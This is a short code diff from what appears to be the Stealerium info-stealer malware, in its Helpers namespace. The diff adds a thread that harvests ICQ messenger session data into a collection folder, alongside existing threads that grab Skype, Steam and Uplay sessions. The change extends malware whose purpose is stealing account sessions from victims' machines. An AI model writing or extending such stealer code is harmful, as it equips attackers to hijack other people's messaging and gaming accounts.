@@ -64,6 +64,11 @@ namespace Stealerium.Helpers
                     Skype.GetSession(sSavePath + "\\Messenger\\Skype")
                 ));
 
+                // Write icq session
+                threads.Add(new Thread(() =>
+                    Icq.GetSession(sSavePath + "\\Messenger\\ICQ")
+                ));
+
                 // Steam & Uplay sessions collection
                 threads.Add(new Thread(() =>
                 {
